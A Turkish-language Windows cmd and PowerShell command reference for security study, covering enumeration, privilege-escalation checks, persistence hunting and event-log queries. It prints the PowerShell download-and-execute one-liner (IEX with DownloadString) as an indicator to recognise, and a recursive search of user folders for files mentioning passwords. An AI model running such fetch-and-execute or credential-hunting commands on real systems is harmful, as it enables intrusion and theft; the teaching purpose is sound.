# 🖥️ Windows Komut Referansı (cmd + PowerShell)

Windows'ta iki kabuk vardır: klasik **cmd** (basit, eski) ve modern **PowerShell** (nesne tabanlı, güçlü). Güvenlikte ikisini de tanımak gerekir — cmd'yi çünkü kısıtlı ortamlarda hâlâ karşına çıkar, PowerShell'i çünkü hem yönetimin hem saldırının ana aracıdır.

> Kavramsal temel: [windows-temelleri.md](windows-temelleri.md). PowerShell'in savunmadaki rolü: [log-analizi.md](../11-soc-mavi-takim/log-analizi.md).

---

## 1. Sistem ve kullanıcı bilgisi

| cmd | PowerShell | Açıklama |
|-----|------------|----------|
| `whoami` | `whoami` | Mevcut kullanıcı |
| `whoami /priv` | — | **Ayrıcalıkları listele (privesc için kritik)** |
| `whoami /groups` | — | Üye olunan gruplar (SID'ler) |
| `hostname` | `hostname` | Makine adı |
| `systeminfo` | `Get-ComputerInfo` | OS/yama/donanım bilgisi |
| `net user` | `Get-LocalUser` | Yerel kullanıcılar |
| `net localgroup administrators` | `Get-LocalGroupMember Administrators` | Yerel yöneticiler |
| `query user` | — | Oturum açan kullanıcılar |

> 🔑 `whoami /priv` — bir shell aldıktan sonra ilk çalıştırılan komutlardan. `SeImpersonatePrivilege` veya `SeBackupPrivilege` gibi bir ayrıcalık görürsen, bu doğrudan bir ayrıcalık yükseltme yoludur (Potato saldırıları vb.).

---

## 2. Ağ

| cmd | PowerShell | Açıklama |
|-----|------------|----------|
| `ipconfig /all` | `Get-NetIPConfiguration` | IP/DNS/MAC bilgisi |
| `netstat -ano` | `Get-NetTCPConnection` | Bağlantılar + PID (`-o`/`-ano`) |
| `arp -a` | `Get-NetNeighbor` | ARP tablosu (yerel cihazlar) |
| `route print` | `Get-NetRoute` | Yönlendirme tablosu |
| `nslookup` | `Resolve-DnsName ornek.com` | DNS sorgusu |
| `ping`, `tracert` | `Test-Connection` | Erişilebilirlik/yol |
| `net view` | — | Ağdaki paylaşımlar/makineler |
| `net share` | `Get-SmbShare` | Yerel paylaşımlar |

> `netstat -ano` (bağlantı + PID) ve ardından `tasklist /svc | findstr <PID>` — "hangi süreç bu bağlantıyı açtı?" sorusunun cevabı; hem tanı hem tehdit avcılığı (threat hunting) için.

---

## 3. Süreç ve servis

| cmd | PowerShell | Açıklama |
|-----|------------|----------|
| `tasklist` | `Get-Process` | Çalışan süreçler |
| `tasklist /svc` | — | Süreç ↔ servis eşlemesi |
| `taskkill /PID 1234 /F` | `Stop-Process -Id 1234` | Süreç sonlandır |
| `sc query` | `Get-Service` | Servisler |
| `sc qc <servis>` | `Get-Service <ad>` | Servis yapılandırması |
| `schtasks /query /fo LIST` | `Get-ScheduledTask` | Zamanlanmış görevler |
| `wmic process list` | `Get-CimInstance Win32_Process` | Ayrıntılı süreç bilgisi |

> **Kesişim:** `sc qc` ile bir servisin ikili yolunu (binary path) incele — tırnaksız yollar (unquoted service path) ve yazılabilir servis ikilileri klasik privesc yollarıdır. `schtasks` ve `Get-ScheduledTask` kalıcılık avında ilk bakılan yerlerdir → [windows-temelleri.md](windows-temelleri.md).

---

## 4. Dosya ve izin

| cmd | PowerShell | Açıklama |
|-----|------------|----------|
| `dir /a` | `Get-ChildItem -Force` | Gizli dahil listele |
| `type dosya` | `Get-Content dosya` | Dosya içeriği |
| `icacls dosya` | `Get-Acl dosya` | ACL izinlerini görüntüle |
| `icacls dosya /grant User:F` | `Set-Acl` | İzin ver |
| `attrib` | — | Dosya öznitelikleri (gizli, salt-okunur) |
| `where komut` | `Get-Command komut` | Bir komutun yolu |
| `findstr` | `Select-String` | Metinde ara (grep karşılığı) |

```powershell
# Bir klasörde parola içeren dosyaları ara (grep -r karşılığı)
Select-String -Path C:\Users\* -Pattern "password" -Recurse -ErrorAction SilentlyContinue

# Yazılabilir servis yollarını ara — privesc enumerasyonu
icacls "C:\Program Files\HizmetX\hizmet.exe"
```

---

## 5. Registry

| cmd | PowerShell | Açıklama |
|-----|------------|----------|
| `reg query HKLM\...\Run` | `Get-ItemProperty HKLM:\...\Run` | Otomatik başlatma girdileri |
| `reg add` | `Set-ItemProperty` | Değer ekle/değiştir |
| `reg query HKCU\... /s` | `Get-ChildItem -Recurse` | Özyinelemeli okuma |

```powershell
# Kalıcılık (persistence) avı: Run anahtarlarını incele
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
```

---

## 6. PowerShell'in gücü: nesne ardışık düzeni (pipeline)

PowerShell'i cmd'den ayıran şey, metin değil **nesne** aktarmasıdır. Bu, güçlü tek satırlık analizler sağlar.

```powershell
# En çok bellek kullanan 5 süreç
Get-Process | Sort-Object WS -Descending | Select-Object -First 5

# Son 1 saatteki başarısız giriş olayları (Event ID 4625)
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625; StartTime=(Get-Date).AddHours(-1)}

# Belirli bir uzantıdaki dosyaları boyutça sırala
Get-ChildItem C:\Data -Recurse -Filter *.log | Sort-Object Length -Descending | Select Name, Length -First 10
```

> **Kesişim:** PowerShell hem savunmanın (Event log sorgulama, tehdit avı) hem saldırının (fileless malware, indir-çalıştır, Empire/Cobalt Strike) baş aktörüdür. Bu yüzden savunmada **PowerShell loglaması** kritiktir: Script Block Logging (Event ID 4104), Module Logging, ve kısıtlı dil modu (Constrained Language Mode). Saldırganın en sevdiği tek satır:
> ```powershell
> # (SADECE savunmayı ANLAMAK için — indir-çalıştır kalıbının neye benzediği)
> IEX (New-Object Net.WebClient).DownloadString('http://.../script.ps1')
> ```
> Bu kalıbı loglarda görmek, klasik bir tehdit göstergesidir (IOC).

---

## 7. Yönetim ve tanı

| Komut | Açıklama |
|-------|----------|
| `gpresult /r` | Uygulanan grup politikaları (GPO) |
| `net accounts` | Parola politikası |
| `wevtutil` / `Get-WinEvent` | Olay günlüğü |
| `Get-HotFix` | Yüklü yamalar (eksik yama = zafiyet) |
| `Test-NetConnection host -Port 443` | Bağlantı + port testi |

> **Kesişim:** `Get-HotFix` ve `systeminfo` çıktısı, "hangi yamalar eksik?" → "hangi CVE'ler sömürülebilir?" analizinin girdisidir (araç: Windows Exploit Suggester). Savunmada aynı çıktı yama uyumluluğunu doğrular.

---

## 8. Hızlı başvuru: en kritik 10 komut (güvenlik)

```
whoami /priv                 → ayrıcalıklarım (privesc)
whoami /groups               → grup üyeliklerim
netstat -ano                 → bağlantılar + PID
tasklist /svc                → süreç-servis eşlemesi
sc qc <servis>               → servis yolu (privesc)
icacls <yol>                 → dosya izinleri
Get-ItemProperty ...\Run     → kalıcılık avı
Get-WinEvent -FilterHash...  → olay günlüğü sorgusu
systeminfo                   → OS/yama envanteri
Get-HotFix                   → yüklü yamalar
```

> **Sonraki:** [pratik-lab/linux-hardening-checklist.md](pratik-lab/linux-hardening-checklist.md).
